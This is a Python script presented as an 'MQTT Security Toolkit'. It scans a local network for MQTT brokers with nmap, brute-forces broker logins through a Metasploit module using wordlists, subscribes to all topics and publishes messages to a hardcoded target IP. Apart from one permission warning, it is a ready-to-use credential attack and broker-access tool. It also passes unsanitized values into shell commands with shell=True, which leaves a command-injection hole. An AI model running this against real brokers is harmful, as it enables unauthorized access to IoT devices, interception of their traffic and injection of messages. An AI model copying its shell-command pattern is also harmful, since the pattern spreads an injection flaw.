import os
import subprocess

def scan_network(ip_range):
    print("\nStep 1: Scanning for Active MQTT Brokers")
    print("📝 First, we need to identify any MQTT brokers running on your network.")
    print("🔍 To do this, we will scan the network for devices that have MQTT services running on port 1883.")
    
    if not ip_range:
        print("Error: No IP range entered. Exiting scan.")
        return

    print("\nScanning the network for active MQTT brokers. Please wait...")
    command = f"nmap -p1883 {ip_range}"
    subprocess.run(command, shell=True)
    print("\n🎯 Scan complete! Review the results above to identify any detected MQTT brokers.")
    print("💡 If you see devices with port 1883 open, those could be MQTT brokers that we can analyze further.")


def brute_force_mqtt(target_ip, user_file, pass_file):
    print("\n🔐 Step 2: Testing MQTT Broker Security")
    print("🔎 Now that we have identified potential MQTT brokers, let’s check if we can access them.")
    print("🛡️ This step will simulate an authentication attack to test for weak credentials.")
    print("⚠️ WARNING: Only perform this step if you have permission to test this MQTT broker!")

    
    if not target_ip:
        print("Error: No IP address entered. Exiting brute-force attack.")
        return
    
    if not os.path.isfile(user_file) or not os.path.isfile(pass_file):
        print("Error: One or both wordlist files do not exist. Exiting.")
        return

    print("\nLaunching the attack... Please wait.")
    command = f"msfconsole -q -x 'use auxiliary/scanner/mqtt/connect; set RHOSTS {target_ip}; set RPORT 1883; set USER_FILE {user_file}; set PASS_FILE {pass_file}; run; exit'"
    subprocess.run(command, shell=True)
    print("\nBrute-force attack completed!")

def subscribe_mqtt(target_ip, topic, username="", password=""):
    print("\nStep 3: Subscribing to an MQTT Broker")
    
    print("\nSubscribing to the topic... Waiting for messages.")
    command = f"mosquitto_sub -h {target_ip} -t \"{topic}\" -u \"{username}\" -P \"{password}\" -v"
    subprocess.run(command, shell=True)
    print("\nSubscription ended.")

def send_mqtt_message(target_ip, topic, message, username="", password=""):
    print("\n📨 Step 3: Publishing a Test Message to an MQTT Broker")
    print("💬 Now, let’s try sending a message to an MQTT broker.")
    print("📡 This helps verify if we can interact with the broker and publish messages to a specific topic.")
    
    if not message:
        print("Error: No message entered. Exiting.")
        return
    
    print("\nSending message...")
    command = f"mosquitto_pub -h {target_ip} -t \"{topic}\" -u \"{username}\" -P \"{password}\" -m \"{message}\""
    subprocess.run(command, shell=True)
    print("\n✅ Message successfully published to the MQTT broker!")
    print(f"💡 You can now check the topic '{topic}' to see if the message was received.")

def main():
    options = {
        "1": lambda: scan_network("192.168.1.0/24"),
        "2": lambda: brute_force_mqtt("192.168.1.76", "usernames.txt", "passwords.txt"),
        "3": lambda: subscribe_mqtt("192.168.1.76", "#"),
        "4": lambda: send_mqtt_message("192.168.1.76", "test/topic", "Hello MQTT")
    }
    
    while True:
        print("\nMQTT Security Toolkit")
        print("1) Scan for Active MQTT Brokers")
        print("2) Test MQTT Broker Security (Brute Force)")
        print("3) Subscribe to an MQTT Topic")
        print("4) Publish a Message to an MQTT Broker")
        print("5) Exit")
        
        choice = "5"  # Default to exit if running in a non-interactive environment
        
        if choice in options:
            options[choice]()
        elif choice == "5":
            print("Exiting the toolkit. Stay secure!")
            break
        else:
            print("\n🎉 You have successfully completed the MQTT security testing process!")
            print("🛡️ Remember to always use this knowledge ethically and responsibly.")
            print("\n👋 Thank you for using the MQTT Security Toolkit!")

if __name__ == "__main__":
    main()
